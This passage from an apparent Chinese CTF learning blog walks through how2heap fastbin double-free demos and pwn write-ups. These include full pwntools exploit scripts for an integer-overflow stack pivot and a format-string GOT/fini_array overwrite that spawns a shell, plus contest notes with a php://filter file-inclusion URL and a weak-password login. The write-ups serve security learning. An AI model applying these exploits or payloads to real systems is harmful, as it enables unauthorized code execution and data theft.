class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br><span class="line">       &quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;);</span><br><span class="line"></span><br><span class="line">unsigned long long stack_var;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, 8+(char *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);</span><br><span class="line">int *a = malloc(8);</span><br><span class="line">int *b = malloc(8);</span><br><span class="line">int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);</span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</span><br><span class="line">// free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b);</span><br><span class="line">free(b);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br><span class="line">&quot;We&apos;ll now carry out our attack by modifying data at %p.\n&quot;, a, b, a, a);</span><br><span class="line">unsigned long long *d = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, d);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p ].\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br><span class="line">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br><span class="line">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br><span class="line">&quot;return a pointer to it.\n&quot;, a);</span><br><span class="line">stack_var = 0x20;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a);</span><br><span class="line">*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;4th malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行程序后，显示如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7ffc2e12fc28.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x2079010</span><br><span class="line">2nd malloc(8): 0x2079030</span><br><span class="line">3rd malloc(8): 0x2079050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x2079010 again, things will crash because 0x2079010 is at the top of the free list.</span><br><span class="line">So, instead, we&apos;ll free 0x2079030.</span><br><span class="line">Now, we can free 0x2079010 again, since it&apos;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x2079010, 0x2079030, 0x2079010 ]. We&apos;ll now carry out our attack by modifying data at 0x2079010.</span><br><span class="line">1st malloc(8): 0x2079010</span><br><span class="line">2nd malloc(8): 0x2079030</span><br><span class="line">Now the free list has [ 0x2079010 ].</span><br><span class="line">Now, we have access to 0x2079010 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x2079010 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x2079010, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7ffc2e12fc28</span><br></pre></td></tr></table></figure><p>之前的步骤都和上一个例子差不多，经过一次double_free后，fastbin里的单链表结构为：0x2079010-&gt;0x2079030-&gt;0x2079010<br>之后我们进行两次malloc，fastbin表头重新变为0x2079010。这时，我们就可以一直申请0x2079010这个地址了。这样我们就可以来<br>构造fake_chunk。<br>程序中，d申请的是chunk_A的地址，而fastbin_list中的地址也是0x2079010。<br>之后就是攻击中最关键的一步了。取satck_var-8的地址，写入d的fd中，这样就伪造了一个fake_chunk<br>而这样，当程序再次进行malloc时，就会认为这里有一个free_chunk并且同意返回一个指向这个栈地址的指针。而如果我们对内存的<br>读写权限，就可以进行对内存的任意地址读写。</p><h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>前一个例子我们讲的是通过在fastbin中插入一个chunk来绕过double_free的检测，而本例中，学习的是通过largebin中的<br>consolidate函数来绕过检测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  void* p1 = malloc(0x40);</span><br><span class="line">  void* p2 = malloc(0x40);</span><br><span class="line">  fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\n&quot;, p1, p2);</span><br><span class="line">  fprintf(stderr, &quot;Now free p1!\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line"></span><br><span class="line">  void* p3 = malloc(0x400);</span><br><span class="line">  fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;, p3);</span><br><span class="line">  fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line">  fprintf(stderr, &quot;Trigger the double free vulnerability!\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: %p %p\n&quot;, malloc(0x40), malloc(0x40));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序运行界面如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated two fastbins: p1=0x866010 p2=0x866060</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3=0x8660b0</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: 0x866010 0x866010</span><br></pre></td></tr></table></figure><p>首先先创建两个大小为0x40的chunk，然后先释放p1。然后，我们在申请一个large_chunk。当我们申请large chunk时，会判断<br>当前fastbin中是否有chunk，有的话就会触发consolidate机制，将fastbin中的chunk移入unsorted bin中。分配之后，这些<br>chunk会按照大小被放回small bin或者large bin。这里，p1会被放回small bin。这个时候p1已经不在fastbin的表头，我们<br>就可以再次释放p1。</p><hr><p>今天就大致总结到这里，下次就开始总结unlink的相关内容。</p>]]></content>
      
      
      
        <tags>
            
            <tag> how2heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-format2-整数溢出</title>
      <link href="/2019/11/20/XCTF-format2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
      <url>/2019/11/20/XCTF-format2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>本文是对一道比较基础的整数溢出题目的解析，其中运用到的一些有关汇编的知识是自己之前没有接触过的，复盘一下收获颇丰，下<br>面我们来看一下吧。</p><a id="more"></a><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>ida看一下程序：<br><img src="/img/format2/1.jpg" alt="avatar"></p><p>程序首先会对输入进行base64解密，然后对解密后的文本限制长度为12字节</p><p><img src="/img/format2/2.jpg" alt="avatar"></p><p>这里就是程序漏洞的所在了，v4是一个整型，只有八个字节，这里存在一个整数溢出，利用这个漏洞就可以控制auth函数的ebp</p><p><img src="/img/format2/3.jpg" alt="avatar"></p><p>这是一个后门函数，我们需要做的就是控制程序流运行后门程序。</p><h2 id="漏洞的具体利用"><a href="#漏洞的具体利用" class="headerlink" title="漏洞的具体利用"></a>漏洞的具体利用</h2><p>要利用这个漏洞，我们首先就要对汇编语言有一定的了解。<br>当main函数要进入auth函数时，会先进行如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">move esp,ebp</span><br><span class="line">sub esp,0x28</span><br></pre></td></tr></table></figure><p>所以auth的ebp就是main的ebp，而在main函数中，最后是leave ，retn<br><img src="/img/format2/4.jpg" alt="avatar"><br>这样我们先修改ebp的值为input_addr,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move esp,ebp  /esp的值变为input_addr</span><br><span class="line">pop ebp</span><br><span class="line">retn(pop rip)  //控制程序流 即call (ebp+4)</span><br></pre></td></tr></table></figure><p>这样我们就可以get shell</p><h2 id="脚本实现"><a href="#脚本实现" class="headerlink" title="脚本实现"></a>脚本实现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">p = process(&apos;./format&apos;)</span><br><span class="line">system = 0x8049284 </span><br><span class="line">input_addr = 0x811eb40</span><br><span class="line">p.recvuntil(&apos;Authenticate : &apos;)</span><br><span class="line">payload = &apos;a&apos;*4 + p32(system) + p32(input_addr)</span><br><span class="line">p.sendline(base64.b64encode(payload))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mma-ctf-2nd-2016-greeting-150</title>
      <link href="/2019/11/18/mma-ctf-2nd-2016-greeting-150/"/>
      <url>/2019/11/18/mma-ctf-2nd-2016-greeting-150/</url>
      
        <content type="html"><![CDATA[<p>一道比较好的格式化字符串，通过这道题目可以有效训练自己构造payload的能力</p><a id="more"></a><h2 id="漏洞的大致分析"><a href="#漏洞的大致分析" class="headerlink" title="漏洞的大致分析"></a>漏洞的大致分析</h2><p>我们在linux中分析之后发现这是一个32位的程序，开启了NX保护和canary<br><img src="/img/greeting/1.jpg" alt="avatar"><br>通过ida逆向一下<br><img src="/img/greeting/2.jpg" alt="avatar"><br>我们发现这里有一个很明显的格式化字符串漏洞，这样我们就可以通过修改函数的got表为system的plt来实现我们的目的。</p><h2 id="漏洞的具体利用方式"><a href="#漏洞的具体利用方式" class="headerlink" title="漏洞的具体利用方式"></a>漏洞的具体利用方式</h2><p>我首先使用了一个计算格式化字符串偏移的通用脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># fmt_test.py</span><br><span class="line">#! /usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">    p = process(&quot;./pwn&quot;)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    info = p.recv()</span><br><span class="line">    p.close()</span><br><span class="line">    return info</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">print autofmt.offset</span><br></pre></td></tr></table></figure><p>得到格式化字符串偏移为12<br>又经过测试：<br><img src="/img/greeting/3.jpg" alt="avatar"><br>这里我们到时候在写payload的时候需要填充两个字符(其实我也不知道为什么……)</p><p>本程序是没有循环的，所以我们需要修改程序的fina_array为start地址，这样就会重新执行一遍，然后执行到我们修改的函数，<br>就可以cat flag<br>所以这样，我们就需要修改的就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strlen-&gt;system  0x08049A54-&gt; 0x08048490</span><br><span class="line">fina_array-&gt;start  0x08049934-&gt; 0x080484f0</span><br></pre></td></tr></table></figure><p>这样我们就可以开始构造我们的payload了<br>由于我们要修改的地址较大，在构造payload的时候就要采用%k&amp;hn的方式来修改两个字节，这样可以提高效率</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;aa&apos;</span><br><span class="line">payload += p32(fina_array) </span><br><span class="line">payload += p32(strlen_got+2)</span><br><span class="line">payload += p32(strlen_got)</span><br><span class="line">payload += &apos;%34000c%12$hn&apos;  //首先写入(34000+32)个字符来修改fina_array的后两个字节，这里34032=0x84f0</span><br><span class="line">payload += &apos;%33556c%13$hn&apos;  //33556+34032=0x10804，由于hn只写入两个字节，所以0x10000忽略，写入0x804</span><br><span class="line">payload += &apos;%31844c%14$hn&apos;  //31844+0x10804=0x18490,写入0x8490</span><br></pre></td></tr></table></figure><p>至此我们成功构造出了我们的payload</p><h2 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./pwn&apos;)</span><br><span class="line">#p = remote(&apos;111.198.29.45&apos;,47537)</span><br><span class="line">strlen_got = 0x08049a54</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">fina_array = 0x08049934</span><br><span class="line">start = 0x080484f0</span><br><span class="line">payload = &apos;aa&apos;</span><br><span class="line">payload += p32(fina_array) </span><br><span class="line">payload += p32(strlen_got+2)</span><br><span class="line">payload += p32(strlen_got)</span><br><span class="line">payload += &apos;%34000c%12$hn&apos;  </span><br><span class="line">payload += &apos;%33556c%13$hn&apos;  </span><br><span class="line">payload += &apos;%31884c%14$hn&apos;  </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>通过这道题的学习，自己对格式化字符串的理解加深了不少，其实这类题目最重要的还是payload需要构造的巧妙，只要理解了格式化<br>字符串漏洞，以后面对这一类的问题就能够游刃有余了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MCTF校赛WP(2)</title>
      <link href="/2019/10/22/MCTF%E6%A0%A1%E8%B5%9BWP-2/"/>
      <url>/2019/10/22/MCTF%E6%A0%A1%E8%B5%9BWP-2/</url>
      
        <content type="html"><![CDATA[<h2 id="Reserve"><a href="#Reserve" class="headerlink" title="Reserve"></a>Reserve</h2><p>  初赛的逆向题目还是比较常规的那种，也没有说给你加个壳什么的，还是比较好拿分的</p><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>签到题不必多说了，直接ida反编译一下，发现flag MCTF{WelC0Me_T0_R3_World}</p><h3 id="mod"><a href="#mod" class="headerlink" title="mod"></a>mod</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MCTF初赛WP(1)</title>
      <link href="/2019/10/17/MCTF%E5%88%9D%E8%B5%9BWP-1/"/>
      <url>/2019/10/17/MCTF%E5%88%9D%E8%B5%9BWP-1/</url>
      
        <content type="html"><![CDATA[<p>这次校赛是我们17的大佬组织的，题目全都是大佬出的，自己做了一下，题目质量挺高的，有难题也有对新手比较友好的题目，下面<br>的WP。</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>平时没怎么看web题真的是太伤了，这次校赛自己的劣势就很大。所以只能看看那些比较简单的题目。</p><h3 id="欢迎入坑"><a href="#欢迎入坑" class="headerlink" title="欢迎入坑"></a>欢迎入坑</h3><p>这道题真的是非常友好了，直接f12看一下网页的源代码，发现flag就在里面： mctf{Ba1du_Y0u_know}</p><h3 id="白驹过隙"><a href="#白驹过隙" class="headerlink" title="白驹过隙"></a>白驹过隙</h3><p>这道题打开网址之后会发生一次跳转，跳到百度上面去，所以只要ctrl+u查看源代码可以看到跳转之前的源代码</p><p><img src="/img/%E7%99%BD%E9%A9%B9%E8%BF%87%E9%9A%99.jpg" alt="avatar"></p><h3 id="隐藏信息"><a href="#隐藏信息" class="headerlink" title="隐藏信息"></a>隐藏信息</h3><p>点进去以后是一个比较复杂的网页，直接看源代码发现有个‘ctf photo’，所以联想到与背景图片有关系<br>用火狐浏览器打开后可以直接查看背景，得到flag</p><p><img src="/img/%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF.jpg" alt="avatar"></p><h3 id="拜拜了您"><a href="#拜拜了您" class="headerlink" title="拜拜了您"></a>拜拜了您</h3><p>这道题进入后有一个click me？点击后发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.26.247:8088/3a3e05990bf99eb34/index.php?file=show.php</span><br></pre></td></tr></table></figure><p>所以这里有一个文件包含的漏洞<br>构造如下url来泄露源码base64值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.26.247:8088/3a3e05990bf99eb34/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>将得到的base64解码就是flag了<br><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.jpg" alt="avatar"></p><h3 id="技术大牛"><a href="#技术大牛" class="headerlink" title="技术大牛"></a>技术大牛</h3><p>一开始以为是有什么注入的漏洞啥的，最后发现是一个弱口令….好吧<br>用户名是admin，密码是admin123 直接进入就是flag</p><h3 id="剁手"><a href="#剁手" class="headerlink" title="剁手"></a>剁手</h3><p>打开以后说是知名购物网站，直接输入淘宝试一试，发现说只能用10.10.10.10访问，所以就抓包把host改成了10.10.10.10<br>发现出现了只能用xp访问，就再把user agent改到xp版本，结果又出现了你从哪儿来的呀……好吧。最后在度娘的帮助下，才知<br>道应该把Referer改成<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ,最后得到flag：<br><img src="/img/%E5%89%81%E6%89%8B.jpg" alt="avatar"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>这次的杂项题还是很有趣的，也是让人脑洞大开。</p><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>这道题就不用多描述了，毕竟是签到题</p><h3 id="数学大礼包"><a href="#数学大礼包" class="headerlink" title="数学大礼包"></a>数学大礼包</h3><p>这道题目比较有趣，只要是数学功底比较好的人都是能够很容易的得出答案的。题目给了三段flag，第一段是一个斐波那契，第二段是<br>一个求概率，第三段是求等边三角形的内切圆面积。<br>这里斐波那契只需要写一个很简单的脚本就可以了。大一时候写的都是c的，这次用python写发现可以简单很多，得出第六十六个是27<br>777890035288<br>然后是三双鞋概率，算出是3/5.最后一个边长10根号3等边三角形内切圆面积则是25pi<br>所以得出flag：MCTF{27777890035288-3/5-25pi}</p><h3 id="另一种方式"><a href="#另一种方式" class="headerlink" title="另一种方式"></a>另一种方式</h3><p>这道题是一个多重base64编码，由于编码后的文本长度比较大，就不放在wp里面了。简单的贴一下自己的脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a = open(&apos;aaa.txt&apos;,&apos;ra&apos;).read()</span><br><span class="line">#print a </span><br><span class="line"></span><br><span class="line">for i in range(19):</span><br><span class="line">a=base64.b64decode(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure><p>运行之后得到flag<br><img src="/img/%E6%96%B0%E7%9A%84%E6%96%B9%E5%BC%8F.jpg" alt="avatar"></p><h3 id="难上加难"><a href="#难上加难" class="headerlink" title="难上加难"></a>难上加难</h3><p>这道题给了我们一张jpg图片，理所当然的binwalk跑一下，发现分解出了一张标识符损坏的二维码图片，手残而且不会ps的我花了很长的时间才修复好</p><h3 id="图种"><a href="#图种" class="headerlink" title="图种"></a>图种</h3><p>这道题拿到手之后很容易就发现，他的长和宽好像是不匹配的，所以想到了改图片的尺寸<br>丢到winhex里面<br><img src="/img/%E5%9B%BE%E7%A7%8D1.jpg" alt="avatar"></p><p>只要把这两个数值改成一样的就可以了</p><p><img src="/img/%E5%9B%BE%E7%A7%8D2.jpg" alt="avatar"><br>得到flag</p><h3 id="easy-lsb"><a href="#easy-lsb" class="headerlink" title="easy lsb"></a>easy lsb</h3><p>这道题拿到手就知道是一道lsb隐写的题，师兄也很贴心的给出了脚本。<br>这里我们由于忘记了脚本用法，我们就先空跑一下脚本<br>发现他给出了使用方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python lsb.py </span><br><span class="line">LSB steganogprahy. Hide files within least significant bits of images.</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  lsb.py hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;</span><br><span class="line">  lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;</span><br><span class="line">  lsb.py analyse &lt;stego_file&gt;</span><br></pre></td></tr></table></figure><p>我们需要用到的应该是第二个，所以我们还是需要知道这道题的加密密码。一开始我用文件名和github都试了一下，发现不对，最后<br>才想起来出题师兄比较自恋，所以用他的名字尝试了一下，居然真的对了！emmmmmmmm<br>flag：MCTF{lsb_do_u_find_it}</p><h3 id="奇怪的数字"><a href="#奇怪的数字" class="headerlink" title="奇怪的数字"></a>奇怪的数字</h3><p>拿到题目就有种熟悉又陌生的感觉，后来想起来这道题和今年上半年西湖论剑杯的一道TTL隐写题差不多，不过那时候我还是个小菜鸡<br>。这道题给了一大串数字，不过浏览一下以后发现其实只有127,191,63和255四种数字，。然后我们把它们全部转成二进制试一试，惊喜发现他们的后六位全部都是一样的，前两位则分别是00,01，10,11，于是就尝试先利用脚本吧他们的前两位全部拼接起来转成16<br>进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">f = open(&apos;txt.txt&apos;,&apos;rw&apos;).readlines()</span><br><span class="line">b = []</span><br><span class="line">for i in f:</span><br><span class="line">b.append(int(i))</span><br><span class="line">string = &apos;&apos;</span><br><span class="line">for i in b:</span><br><span class="line">if i == 255:</span><br><span class="line">string+=&apos;11&apos;</span><br><span class="line">elif i == 191:</span><br><span class="line">string+=&apos;10&apos;</span><br><span class="line">elif i == 127:</span><br><span class="line">string += &apos;01&apos;</span><br><span class="line">elif i == 63:</span><br><span class="line">string += &apos;00&apos;</span><br><span class="line">#print string</span><br><span class="line">c = &apos;&apos;</span><br><span class="line">for i in range(0,len(string),8):</span><br><span class="line">c+=chr(int(string[i:i+8],2))</span><br><span class="line">print c</span><br></pre></td></tr></table></figure><p><img src="/img/ttl1.jpg" alt="avatar"></p><p>这里可以看到这是一个ffd8开头的文件，这其实就是一个jpg格式的文件了，继续写脚本把它转换成图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">f = open(&apos;txt.txt&apos;,&apos;rw&apos;).readlines()</span><br><span class="line">b = []</span><br><span class="line">for i in f:</span><br><span class="line">b.append(int(i))</span><br><span class="line">string = &apos;&apos;</span><br><span class="line">for i in b:</span><br><span class="line">if i == 255:</span><br><span class="line">string+=&apos;11&apos;</span><br><span class="line">elif i == 191:</span><br><span class="line">string+=&apos;10&apos;</span><br><span class="line">elif i == 127:</span><br><span class="line">string += &apos;01&apos;</span><br><span class="line">elif i == 63:</span><br><span class="line">string += &apos;00&apos;</span><br><span class="line">#print string</span><br><span class="line">c = &apos;&apos;</span><br><span class="line">for i in range(0,len(string),8):</span><br><span class="line">c+=chr(int(string[i:i+8],2))</span><br><span class="line">print c</span><br><span class="line">c = binascii.unhexlify(c)  #将16进制转化为2进制</span><br><span class="line">d = open(&apos;img.jpg&apos;,&apos;w&apos;)</span><br><span class="line">d.write(c)</span><br><span class="line">d.close()</span><br></pre></td></tr></table></figure><p>查看以后发现一部分二维码<br><img src="/img/ttl.jpg" alt="avatar"><br>把二维码放入stegsolve，分析图层，发现有一共六张二维码，保存之后拼一下，就是完整的二维码</p><p>扫码得到“key:AutomaticKey cipher:fftu{2028mb39927wn1f96o6e12z03j58002p}”<br>看到这个首先尝试AutoKey密码解密，发现答案错误，所以尝试一下用维吉尼亚密码，对了<br>flag{2028ab39927df1d96e6a12b03j58002v}</p><h3 id="小文件"><a href="#小文件" class="headerlink" 